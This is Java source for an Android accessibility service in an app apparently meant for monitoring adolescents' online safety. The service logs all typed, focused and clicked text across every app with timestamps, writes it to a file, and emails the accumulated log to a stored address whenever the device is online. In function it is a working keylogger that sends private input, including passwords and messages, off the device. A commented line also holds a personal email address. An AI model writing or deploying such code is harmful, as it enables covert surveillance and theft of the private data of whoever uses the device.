package com.example.adolescentonlinesafety;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Calendar;

import io.paperdb.Paper;


public class TestServices extends AccessibilityService {
        public String res = "";





    @Override
        public void onServiceConnected() {
            Log.v("Connected :", "Onservice() Connected...");


            AccessibilityServiceInfo info = new AccessibilityServiceInfo();
            info.eventTypes = AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED;
            info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
            info.feedbackType = AccessibilityServiceInfo.FEEDBACK_ALL_MASK;
            info.notificationTimeout = 100;
            info.packageNames = null;
            setServiceInfo(info);
        }


        @Override
        public void onAccessibilityEvent(AccessibilityEvent event) {

            DateFormat df = new SimpleDateFormat("dd MMM, hh:mm ");
            String time = df.format(Calendar.getInstance().getTime());

            switch (event.getEventType()) {
                case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED: {
                    String data = event.getText().toString();

                    data=time + "|(TEXT)|" + data;
                    res = res + data + "\n";

                    Log.v("OP: ", time + "|(TEXT)|" + data);
                    break;
                }
                case AccessibilityEvent.TYPE_VIEW_FOCUSED: {
                    String data = event.getText().toString();
                    data=time + "|(FOCUSED)|" + data;
                    res = res + data + "\n";

                    Log.v("OP: ", time + "|(FOCUSED)|" + data);
                    break;
                }
                case AccessibilityEvent.TYPE_VIEW_CLICKED: {
                    String data = event.getText().toString();
                    data=time + "|(CLICKED)|" + event.getText().toString() + data;
                    res = res + data + "\n";

                    Log.v("OP: ", time + "|(CLICKED)|" + event.getPackageName().toString() + data);

                    if (res.length() > 1000) {
                        try {

                            File file = new File(getApplicationContext().getExternalFilesDir(null), "Log.txt");
                            FileOutputStream fos = new FileOutputStream(file, true);
                            fos.write(res.getBytes());
                            fos.close();

                            double fsize = (double) file.length() / 1024;
                            ConnectivityManager conMgr = (ConnectivityManager) getSystemService(getApplicationContext().CONNECTIVITY_SERVICE);


                            if (fsize > 5.0) {
                                if (conMgr.getNetworkInfo(ConnectivityManager.TYPE_MOBILE).getState() == NetworkInfo.State.CONNECTED
                                        || conMgr.getNetworkInfo(ConnectivityManager.TYPE_WIFI).getState() == NetworkInfo.State.CONNECTED) {

                                    StringBuilder text = new StringBuilder();
                                    BufferedReader br = new BufferedReader(new FileReader(file));
                                    String line;

                                    while ((line = br.readLine()) != null) {
                                        text.append(line);
                                        text.append('\n');
                                    }
                                    br.close();

                                    //Creating SendMail object
                                    try {


                                        // getting user registered email from paper
                                        Paper.init(this);
                                        String finall_email = Paper.book().read(Configuration.FirstEmailKey);

                                     // SendingEmail sm = new SendingEmail(this,"timosankhulani@gmail.com","Activity Data",text.toString()); //Change XXXX by email adress where to send
                                        SendingEmail sm = new SendingEmail(this,""+finall_email,
                                                "info",
                                                text.toString());


                                        //Executing sendmail to send email
                                        sm.execute();
                                        file.delete();
                                    }
                                    catch (Exception e){
                                        Log.v("err","Error while sending mail:"+e.getMessage());
                                    }
                                }
                            }

                        } catch (Exception e) {
                            Log.v("msg", e.getMessage());
                        }

                        res = "";
                    }

                    break;
                }
                default:
                    break;
            }


        }

        @Override
        public void onInterrupt() {
            Log.d("Interrupt", "onInterrupt() is Called...");
        }



}
